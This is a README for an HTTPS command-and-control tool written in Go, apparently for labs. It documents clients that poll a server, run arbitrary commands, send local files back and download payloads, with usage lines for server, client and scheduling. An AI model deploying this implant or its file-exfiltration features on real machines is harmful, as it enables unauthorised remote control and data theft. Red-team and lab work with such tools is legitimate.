# HTTPS Reverse Shell

This program implements a simple Command-and-Control (C2) system allowing an operator to:
- Start a **server** that listens for clients.
- Launch **clients** that connect to the server, receive commands, and send results.
- **Schedule** commands that the clients will retrieve and execute.

Clients establish a secure (TLS) connection to the server (with an option to skip certificate verification in testing or lab environments). The server persists each client’s results on disk and keeps in-memory data about all known clients (referred to as *targets*).

---

## Table of Contents

1. [Features](#features)
2. [Getting Started](#getting-started)
3. [Building and Running](#building-and-running)
4. [Usage](#usage)
   - [Server Subcommand](#server-subcommand)
   - [Client Subcommand](#client-subcommand)
   - [Schedule Subcommand](#schedule-subcommand)
5. [Endpoints](#endpoints)
6. [Configuration & Environment Variables](#configuration--environment-variables)
7. [Directory Structure](#directory-structure)
8. [Example Workflows](#example-workflows)
9. [FAQ](#faq)

---

## Features

- **TLS** support for encrypted traffic (server certificate required).
- **Modular commands**:
  - `exec` – Run arbitrary applications on the client machine.
  - `upload` – Send a local file’s contents back to the server.
  - `download` – Retrieve a file from the server to the client.
- **Periodic check-ins**: Clients contact the server every 30 seconds by default.
- **File serving** for downloading files stored under `./files/`.
- **Lightweight concurrency** using Go’s standard library and **gorilla/mux** router.

---

## Getting Started

### Prerequisites
- **Go 1.18+** installed.
- A **TLS certificate** (`server.crt`) and **private key** (`server.key`).
  - You can generate a self-signed certificate for local testing:
    ```bash
    openssl req -x509 -newkey rsa:4096 -nodes -keyout server.key -out server.crt -days 365
    ```
- (Optional) **git** if you want to clone from a repository.

---

## Building and Running

1. **Clone or Download** this project’s source code into a directory.
2. Open a terminal in that directory.
3. **Build the code** (or use `go run`):
   ```bash
   go build -o rsh main.go
   ```
4. You’ll get an executable named `rsh`

---

## Usage

After building, run `./rsh --help` to see top-level CLI usage. The application has three major subcommands: server, client, and schedule.

### Server Subcommand
```bash
./rsh server --addr ":9000" --cert "server.crt" --key "server.key"
```

- **Purpose**: Launches the HTTPS server, listens for client connections and commands.
- **Flags**:
  - `--addr`: The address on which to listen (default `:9000`).
  - `--cert`: Path to the TLS certificate file (default `server.crt`).
  - `--key`: Path to the TLS private key file (default `server.key`).

When the server start, it will:
1. Serve routes for client registration/check-in, command submission, result uploads.
2. Serve files from the `files/` directory under the endpoint `/api/v1/file/{name}`.

### Client Subcommand
```bash
./rsh client --addr "https://127.0.0.1:9000"
```
- **Purpose**: Runs a client that registers with the specified server, fetches pending commands, executes them, and sends results back.
- **Flags**:
  - `--addr`: The server’s URL (default `https://127.0.0.1:9000`).

The client will:
1. Generate a unique ID.
2. Send a `PUT` request to `/api/v1/target/{ID}` with minimal info about itself.
3. Receive any unexecuted commands from the server.
4. Execute each command:
  - `exec`: Runs an external program (e.g., `ipconfig`, `ls`, etc.) on the client.
  - `upload`: Reads a file locally and sends its content back as the command result.
  - `download`: Retrieves a file from the server and writes it locally.
5. Sleep for 30 seconds and repeat.

### Schedule Subcommand
```bash
./rsh schedule --addr "https://127.0.0.1:9000" --id "demo" --run "exec" ipconfig /all
```
- - **Purpose**: Lets an operator add a new command to the server queue. Clients that haven’t run the command yet will pick it up on their next check-in.
- **Flags**:
  - `--addr`: The server to connect to (default `https://127.0.0.1:9000`).
  - `--id`: Unique identifier for the new command (e.g. `demo`).
  - `--run`: The command type (`exec`, `upload`, `download`, etc.)
- **Arguments**: Additional arguments are passed to the command.

Example:
- **Command ID**: `demo`
- **Type**: `exec`
- **Arguments**: `ipconfig /all`

This instructs any unregistered client to run `ipconfig /all` locally and send back the output.

---

## Endpoints
When the server is running, it defines these key routes:
1. `GET /help`: Displays usage info about server endpoints.
2. `PUT /api/v1/target/{targetID}`: Used by clients to register/check in. Returns new commands as JSON.
3. `PUT /api/v1/command/{commandID}`: Server operator uses this to schedule a command.
4. `PUT /api/v1/target/{targetID}/command/{commandID}/result`: Clients send command results to the server.
5. `GET /api/v1/file/{filename}`: Clients download a file from the server’s ./files/ directory.

---

## Configuration & Environment Variables
- **INSECURE** (Optional): If set to "true", the client will skip TLS certificate verification.
```bash
export INSECURE=true
./rsh client ...
```
Useful for self-signed certificates or local test setups. In a production environment, consider disabling this and using properly trusted certificates.

---

## Directory Structure
An example layout when running the server:

```less
.
├── main.go                  // The main code
├── results/                 // Automatic directory created for command outputs
│   └── clientID/
│       └── commandID.txt
├── files/                   // Place files here for clients to download
│   └── samplepayload.exe
├── server.crt               // TLS certificate file
├── server.key               // TLS private key file
└── rsh                      // The compiled binary
```
- **results/**: Each client gets a subdirectory named after its ID. Results for commands are stored as text files.
- **files/**: Any file placed here can be retrieved by clients via `GET /api/v1/file/{filename}`.

---

## Example Workflows
### Start the Server
```bash
./rsh server --addr ":9000" --cert "server.crt" --key "server.key"
```
The server listens on port 9000 for TLS traffic.

### Launch a Client
```bash
./rsh client --addr "https://127.0.0.1:9000"
```
The client:
- Registers with the server.
- Checks for pending commands every 30 seconds.

### Schedule a Command
```bash
./rsh schedule --addr "https://127.0.0.1:9000" --id "testcmd" --run "exec" uname -a
```
- Adds command ID `testcmd` of type `exec` with the arguments `uname -a`.
- The client picks up this command, executes `uname -a`, sends back the results.

### View Results
- Check the server’s logs to see the output or open files under `results/<clientID>/<commandID>.txt`.

---

## FAQ
**Q**: *Why does the client skip TLS verification by default?*\
**A**: By default, it doesn’t skip. It only does if `INSECURE=true`. This is useful for demos or labs using self-signed certs.

**Q**: *How do I handle large file transfers?*\
**A**: Currently, `upload` reads the entire file into memory and sends it as a single string. For extremely large files, consider implementing a streaming upload or a more robust approach.

**Q**: *Can I run multiple servers on different ports?*\
**A**: Yes. Each server process is independent. Just pass a different `--addr` argument.

